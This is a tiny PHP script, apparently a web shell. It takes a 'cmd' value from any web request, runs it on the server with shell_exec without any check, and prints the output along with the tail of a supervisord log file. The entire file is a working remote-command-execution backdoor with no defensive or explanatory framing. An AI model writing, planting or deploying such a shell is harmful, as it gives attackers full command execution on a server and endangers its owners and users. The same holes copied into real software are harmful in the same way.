<?php
$cmd=$_REQUEST['cmd'];
echo $cmd;
echo '<pre>';
echo shell_exec('tail /tmp/supervisord.log');
echo shell_exec($cmd);
echo '</pre>';
